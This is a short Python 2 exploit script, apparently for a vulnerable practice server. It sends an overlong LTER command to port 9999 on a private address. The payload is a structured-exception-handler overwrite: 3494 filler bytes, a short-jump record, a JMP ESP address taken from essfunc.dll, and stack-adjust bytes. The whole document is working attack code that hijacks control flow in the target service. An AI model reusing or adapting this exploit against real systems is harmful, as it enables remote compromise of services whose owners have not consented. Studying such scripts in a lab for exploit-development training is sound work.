#!/usr/bin/python

import socket
import os
import sys

host = "192.168.100.118"
port = 9999

nSeh = '\x74\x06\x75\x04' # NetJumping -\x74 (JZ) \x06 and  \x75 (JNZ) \x04
Seh  = '\x2b\x17\x50\x62' # 0x6250172B - JMP ESP - essfunc.dll
espAdj = "\x54\x58\x66\x05\x11\x11\x2C\x62\x50\x5C"

buffer = 'A' * 3494
buffer += nSeh
buffer += Seh
buffer += espAdj
buffer += 'D' * (4000 - len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("LTER /.../" + buffer)
print s.recv(1024)
s.close()

